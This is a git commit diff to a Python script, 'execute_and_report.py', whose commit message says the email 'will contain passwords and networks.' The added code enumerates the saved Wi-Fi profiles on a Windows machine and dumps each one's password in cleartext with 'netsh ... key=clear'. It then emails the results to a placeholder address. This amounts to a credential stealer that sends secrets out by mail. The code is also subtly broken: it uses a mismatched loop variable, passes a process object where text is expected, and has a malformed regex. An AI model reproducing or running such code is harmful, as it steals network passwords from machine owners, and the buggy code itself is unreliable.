78f153883da2cabd451de334c4d69f12170d3614
Shane Calder <shanescottcalder@gmail.com>
2018-07-31 08:08:21 -0600

    Add files via upload
    email will contain passwords and networks.

--- execute_and_report.py
+++ execute_and_report.py
@@ -14,9 +14,14 @@ def send_mail(email, password, message):
     server.quit()
 
 # MS command
-command = "netsh wlan show profile" key = clear
+command = "netsh wlan show profile"
 networks = subprocess.Popen(command, shell = True)
-network_names = re.findall(('?:Profiles\s*:\s)(.*)', networks)
-print(network_names)
+network_names_list = re.findall(('?:Profiles\s*:\s)(.*)', networks)
+
+result = ''
+for network_names in network_names_list:
+    command = 'netsh wlan show profile ' + network_name + ' key=clear'
+    current_result = subprocess.check_output(command, shell = True)
+    result = result + current_result
 
 send_mail('youremail@youremailprovider.com', '12345', result)
